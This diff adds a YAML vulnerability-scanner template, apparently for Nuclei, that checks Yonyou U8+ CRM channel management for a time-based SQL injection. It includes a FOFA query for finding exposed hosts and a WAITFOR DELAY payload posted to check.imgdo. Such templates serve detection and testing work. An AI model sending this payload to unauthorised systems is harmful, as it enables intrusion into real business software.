@@ -1,0 +1,50 @@
+id: poc-yaml-yongyon-u8-cm-ae-check-imgdo-sqli
+info:
+  name: 用友U8+渠道管理(高级版) check.imgdo SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 用友U8+渠道管理(高级版)
+    fofa: body="用友U8CRM"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /indexbusiness.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "渠道管理（高级版）"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /business/test/check.imgdo HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _id=';WAITFOR DELAY '0:0:{{t1}}'--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - duration > to_number(t1) && duration < to_number(t2)
